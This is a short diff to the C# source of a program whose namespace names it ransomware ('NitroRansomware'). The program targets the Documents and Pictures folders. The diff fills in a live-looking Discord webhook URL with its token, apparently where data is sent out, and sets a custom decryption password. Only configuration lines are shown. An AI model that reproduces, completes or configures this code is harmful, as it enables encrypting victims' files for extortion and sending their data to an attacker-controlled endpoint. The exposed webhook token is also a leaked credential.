@@ -14,8 +14,8 @@ namespace NitroRansomware
         static string documents = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
         static string pictures = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
 
-        public static string WEBHOOK = "discord webhook goes here";
-        public static string DECRYPT_PASSWORD = "ZGVmYXVsdHBhc3N3b3Jk";
+        public static string WEBHOOK = "https://discord.com/api/webhooks/956198736697110528/SSr64aJsg9PLEyvv564seUfqkR2X8bXZttMtP_rZDs9QZalQewXweorgMXKAoMQVwAi6";
+        public static string DECRYPT_PASSWORD = "Mikeisdomenachterlijk";
         
         static Logs logging = new Logs("DEBUG", 0);
         static Webhook ww = new Webhook(WEBHOOK);
